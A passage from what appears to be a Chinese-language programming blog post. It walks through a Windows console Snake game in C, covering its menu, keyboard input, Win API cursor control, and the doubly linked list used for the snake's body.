class="comment">#define false 0 // 将true和false作为对应到1和0的宏</span></span><br><span class="line"><span class="comment">#define true 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> *<span class="title">prior</span>, *<span class="title">next</span>;</span></span><br><span class="line">&#125; snake;<span class="comment">//蛇身体的一个结点的类型</span></span><br><span class="line">snake *head, *tail;<span class="comment">//指向蛇头和蛇尾结点的指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">APPLE</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125; apple;<span class="comment">//苹果的坐标数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> score, pre_x, pre_y, wait = <span class="number">500</span>;<span class="comment">//得分;前一个x,y坐标;等待时长(和游戏难度有关---改变蛇移动的速度)</span></span><br><span class="line"><span class="type">int</span> HEIGHT = <span class="number">30</span>;<span class="comment">//地图高度</span></span><br><span class="line"><span class="type">int</span> WIDTH = <span class="number">30</span>;<span class="comment">//地图宽度</span></span><br><span class="line"><span class="type">int</span> curSnakeLen = <span class="number">0</span>;<span class="comment">//当前的蛇身长度</span></span><br><span class="line"><span class="type">int</span> maxSnakeLen = <span class="number">0</span>;<span class="comment">//地图能容纳的最大蛇身长度,达到这个长度意味着游戏胜利</span></span><br></pre></td></tr></table></figure><h2 id="游戏控制-main-c">游戏控制—main.c</h2><p>头文件包含</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span> <span class="comment">// Console Input/Output,定义了通过控制台进行数据输入和数据输出的函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span> <span class="comment">// 包含了所有的函数声明,和为了与c++兼容设置的bool宏</span></span></span><br></pre></td></tr></table></figure><p>代码逻辑</p><p>使用一个while(1)循环来重复开始游戏,从而实现一局游戏结束后可以回到主菜单准备下一次游戏</p><p>在循环中使用一个char c;配合_getch()来进行菜单选择,同时对于错误输出专门使用一个函数来处理</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">printMenu();<span class="comment">//第一次进入循环前先初始化一次菜单</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//控制主循环</span></span><br><span class="line">gotoxy(<span class="number">37</span>, <span class="number">17</span>);<span class="comment">//定位到输入栏</span></span><br><span class="line">c = _getch();<span class="comment">//vs2022要求将getch()更换为_getch()---标准c编译器换回getch()(?)</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">initGame();<span class="comment">//游戏数据初始化</span></span><br><span class="line">start();<span class="comment">//正式开始一局游戏</span></span><br><span class="line">            destoryGameData();<span class="comment">//清除游戏数据,释放空间</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//游戏结束清屏</span></span><br><span class="line">printMenu();<span class="comment">//重新打印菜单</span></span><br><span class="line">            </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">color(<span class="number">7</span>);<span class="comment">//将颜色设置回白色</span></span><br><span class="line">gotoxy(<span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;游戏结束!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//跳出循环,结束游戏</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> wrongInput();<span class="comment">//输入非法,打印错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="菜单选择-menu-c">菜单选择—menu.c</h2><p>包含了菜单界面的图形打印,用户错误输入处理,以及游戏初始化的调用接口</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printMenu</span><span class="params">()</span>; <span class="comment">// 打印菜单,其中利用了gotoxy()函数进行控制台光标的跳转</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initGame</span><span class="params">()</span> &#123;<span class="comment">// 初始化各项数据,这些函数在game.c中定义</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>); <span class="comment">// 清屏</span></span><br><span class="line">setDifficulty(); <span class="comment">// 设置游戏难度</span></span><br><span class="line">printBox(); <span class="comment">//打印界面</span></span><br><span class="line">initSnakeAndApple(); <span class="comment">//初始化游戏数据---蛇和苹果的初始状态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wrongInput</span><span class="params">()</span> &#123;<span class="comment">//处理错误的键盘输入---打印报错信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);<span class="comment">//停顿一秒后清除信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         &quot;</span>);</span><br><span class="line">gotoxy(<span class="number">39</span>, <span class="number">17</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="系统相关支持-system-c">系统相关支持—system.c</h2><p>因为是一定程度上基于Windows的程序(主要是一些优化和完善,还有关键的光标跳转),需要使用一些win API函数</p><p>使用_kbhit()来实现检测按键</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> <span class="comment">// Win API支持</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//涉及到windows的API</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color</span><span class="params">(<span class="type">int</span> i)</span> &#123;<span class="comment">//更改文字颜色</span></span><br><span class="line"><span class="comment">//SetConsoleTextAttribute是API设置控制台窗口字体颜色和背景色的函数</span></span><br><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//游戏中每次调用gotoxy时的参数都是根据游戏菜单字符位置/当前坐标计算好传递过来的</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">gotoxy</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">COORD c;</span><br><span class="line"><span class="type">static</span> HANDLE h;</span><br><span class="line">h = GetStdHandle(STD_OUTPUT_HANDLE);<span class="comment">//从标准设备获取句柄</span></span><br><span class="line">c.X = x;</span><br><span class="line">c.Y = y;</span><br><span class="line">SetConsoleCursorPosition(h, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">keyboard</span><span class="params">(<span class="type">int</span> pre)</span> &#123;<span class="comment">//键盘输入判断</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="type">int</span> n = pre;</span><br><span class="line"><span class="keyword">if</span> (_kbhit()) &#123;<span class="comment">//检查是否有键盘输入</span></span><br><span class="line">c = _getch();<span class="comment">//如果有,则进行一次读取</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;w&#x27;</span> || c == <span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;a&#x27;</span> || c == <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;s&#x27;</span> || c == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">n = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;d&#x27;</span> || c == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">n = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">n = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">rewind(<span class="built_in">stdin</span>);<span class="comment">//fflush(stdin); 刷新缓冲区,在VS2015之后不再起作用(编译成功但无效果)</span></span><br><span class="line"><span class="keyword">if</span> ((pre == <span class="number">1</span> &amp;&amp; n == <span class="number">3</span>) || (pre == <span class="number">2</span> &amp;&amp; n == <span class="number">4</span>) || (pre == <span class="number">3</span> &amp;&amp; n == <span class="number">1</span>) || (pre == <span class="number">4</span> &amp;&amp; n == <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> pre;<span class="comment">//如果键盘要求蛇180度转向,则转向失败,蛇仍然按照原来的方向前进</span></span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//成功转向,返回下一步前进的方向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="游戏逻辑-game-c">游戏逻辑—game.c</h2><p>包含了所有的初始化操作,游戏运行逻辑,结算处理</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><h3 id="游戏主循环-start-函数">游戏主循环—start()函数</h3><p>逻辑伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">print_tips(); <span class="comment">// 打印提示</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(againstTheWall() || againstSelf())&#123;</span><br><span class="line">            gameover();<span class="comment">//进行游戏结束的处理</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        print_score();</span><br><span class="line">        </span><br><span class="line">        snake_move(); <span class="comment">//包含有键盘输入的检测和处理,并在检测到暂停时修改pause_game的值</span></span><br><span class="line">        <span class="keyword">if</span>(eat_apple())&#123;</span><br><span class="line">            snake_growth(); <span class="comment">// 蛇长长</span></span><br><span class="line">            <span class="keyword">if</span> (SnakeLen == maxSnakeLen) &#123;</span><br><span class="line">                gamewin();<span class="comment">// 霸屏则游戏胜利</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            generate_new_apples(); <span class="comment">// 生成新苹果</span></span><br><span class="line">            score++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pause_game)&#123;</span><br><span class="line">            pause_the_game(); <span class="comment">//  暂停,直到检测到要求继续的键盘输入</span></span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(wait_time); <span class="comment">// 休眠一段时间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="游戏初始化">游戏初始化</h3><h4 id="设置游戏难度-setdifficulty-函数">设置游戏难度—setDifficulty()函数</h4><p>设置了5个难度,分别对应start()中不同的Sleep时间,以此来影响蛇移动的速度</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setDifficulty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, difficulties[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">1000</span>, <span class="number">800</span>, <span class="number">600</span>, <span class="number">400</span>, <span class="number">200</span>&#125;;<span class="comment">//5种游戏难度---对应不同的等待时间</span></span><br><span class="line">    <span class="comment">// 界面优化相关代码忽略</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输入处理</span></span><br><span class="line">    <span class="type">bool</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) &amp;&amp; n &gt; <span class="number">0</span> &amp;&amp; n &lt; <span class="number">6</span>)</span><br><span class="line">            flag = <span class="number">0</span>;<span class="comment">//输入成功则跳出循环</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入难度[1~5](按回车键确认):&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            rewind(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据输入调整游戏参数</span></span><br><span class="line">    <span class="comment">//wait = 1100 - n * 200; // 旧的调整方法</span></span><br><span class="line">    wait = difficulties[n];<span class="comment">//设置等待时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化分数</span></span><br><span class="line">    score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rewind(<span class="built_in">stdin</span>);<span class="comment">//刷新缓冲区</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//清屏</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打印界面-printbox-函数">打印界面—printBox()函数</h4><p>关键是坐标的计算,要在正确的位置进行打印</p><p>使用&quot;□&quot;字符串进行地图的打印,<strong>因为该字符占用2字节,所以x坐标每次要+=2而不是+=1</strong></p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printBox</span><span class="params">()</span>&#123;</span><br><span class="line">set_map_size(); <span class="comment">// 设置地图大小,大小包括边界(WIDTH和HEIGHT变量,代码略)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//+=2的原因是方块字符并非ASCII字符,占用两个字节大小---坐标每次需要+2而不是+1</span></span><br><span class="line">    <span class="comment">//打印围墙</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; WIDTH * <span class="number">2</span>; i += <span class="number">2</span>) &#123;<span class="comment">//上下</span></span><br><span class="line">        gotoxy(i, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(i, HEIGHT - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= HEIGHT - <span class="number">1</span>; i++) &#123;<span class="comment">//左右</span></span><br><span class="line">        gotoxy(<span class="number">0</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(WIDTH * <span class="number">2</span> - <span class="number">2</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印盒子内部</span></span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= HEIGHT - <span class="number">2</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; WIDTH * <span class="number">2</span> - <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">            gotoxy(i, j);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="初始化蛇和苹果数据">初始化蛇和苹果数据</h4><p>此处涉及到链表操作!</p><p>1.首先容易想到苹果只需要记录其x,y坐标即可</p><p>2.然后对于蛇,其行为有2种—向前移动一格而不增长,前进并增长一格</p><p>3.而且蛇的每一个结点的运动方向都不一定相同—因为蛇会拐弯</p><p>如果使用单链表,就需要对每一个结点保存其下次前进的方向,也就是要知道其前一个结点的坐标是在当前结点的哪个方向(上/下/左/右)并进行存储,不仅浪费空间,而且频繁修改会导致效率低下</p><p>所以,这里使用双链表来实现,很容易找到前一个结点的坐标来确定移动方向</p><p>实际上这里的双链表实际只影响了当前的蛇尾,因为蛇的每一个节点都是相同的,所以前进仅需在蛇头前进方向新增一个蛇头结点作为新蛇头(代码实现实际上是在蛇头后添加一个蛇身结点),然后删除当前的最后一个结点,即蛇尾</p><p>由此为了效率还需使用一个尾指针tail来指向蛇尾(链表尾)</p><p>综上所述,我们要存储(初始化)的数据即为:</p><p>1.苹果的坐标结构体<br>2.一个带有头结点(直接作为蛇头)的双向链表<br>3.一个指向当前链表尾结点(蛇尾)的指针tail</p><p>同时该部分还要进行游戏刚开始的苹果(默认在地图左上角),蛇身(默认在苹果右边,初始长度为4)的打印</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initSnakeAndApple</span><span class="params">()</span>&#123;</span><br><span class="line">    make_a_snake(<span class="number">4</span>); <span class="comment">// 创建一条长度为4的蛇---即初始化一个双向链表,并设置尾指针</span></span><br><span class="line">    <span class="comment">// 同时要对蛇的每一个节点设置初始坐标</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置蛇的长度相关参数</span></span><br><span class="line">    curSnakeLen = <span class="number">4</span>;<span class="comment">//初始时蛇的长度为4</span></span><br><span class="line">    maxSnakeLen = (WIDTH - <span class="number">2</span>) * (HEIGHT - <span class="number">2</span>);<span class="comment">//根据地图大小计算游戏胜利蛇应该达到的长度</span></span><br><span class="line"></span><br><span class="line">    init_apple(<span class="number">8</span>,<span class="number">4</span>); <span class="comment">// 初始化苹果</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//因为代码实现是先无条件前进再进行吃到苹果的处理,所以蛇尾此时已移动,需要提前记录前一个蛇尾的位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇移动-movesnake-函数">蛇移动—moveSnake()函数</h3><p>因为蛇移动并没有长度变化,即蛇头增长,蛇尾缩短,所以直接把蛇尾结点移动到蛇头即可</p><p>对应到链表操作即为修改指针指向,将头结点之后的第一个蛇结点修改为蛇尾,蛇尾结点指向第二个蛇结点,然后倒数第二个结点后驱指向NULL</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">moveSnake</span><span class="params">(<span class="type">int</span> flag)</span> &#123;<span class="comment">//蛇的正常前进</span></span><br><span class="line">    <span class="type">int</span> move[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">-1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">-2</span>, <span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">2</span>,  <span class="number">0</span>&#125;</span><br><span class="line">    &#125;;<span class="comment">//4种不同的移动方向对应的4种坐标变换</span></span><br><span class="line">    flag--;<span class="comment">//对应move数组的元素--从下标0开始</span></span><br><span class="line">    <span class="comment">//保存蛇尾位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">    <span class="comment">//蛇尾,旧蛇头覆盖打印</span></span><br><span class="line">    gotoxy(tail-&gt;x, tail-&gt;y);</span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line"></span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">    <span class="comment">//蛇尾断开</span></span><br><span class="line">    snake *temp = tail;</span><br><span class="line">    tail = tail-&gt;prior;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//蛇尾结点作为新头,不需要删除创建,节省时间</span></span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    temp-&gt;prior = <span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;prior = temp;</span><br><span class="line">    head = temp;</span><br><span class="line">    <span class="comment">//新蛇头位置计算并打印</span></span><br><span class="line">    head-&gt;x = head-&gt;next-&gt;x + move[flag][<span class="number">0</span>];</span><br><span class="line">    head-&gt;y = head-&gt;next-&gt;y + move[flag][<span class="number">1</span>];</span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇长长-snakegrowth-函数">蛇长长—snakeGrowth()函数</h3><p>实际上是双向链表的尾插结点操作</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">snakeGrowth</span><span class="params">()</span> &#123;<span class="comment">//蛇的长度增长</span></span><br><span class="line">    <span class="comment">//新增蛇身结点---即在蛇尾新增一个结点并即刻打印(蛇此时已前进一格且吃到苹果</span></span><br><span class="line">    tail-&gt;next = (snake *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    tail-&gt;next-&gt;prior = tail;</span><br><span class="line">    tail = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    tail-&gt;x = pre_x;</span><br><span class="line">    tail-&gt;y = pre_y;</span><br><span class="line">    ++curSnakeLen;<span class="comment">//当前长度+1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印图像</span></span><br><span class="line">    gotoxy(pre_x, pre_y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);<span class="comment">//进行打印</span></span><br><span class="line">    <span 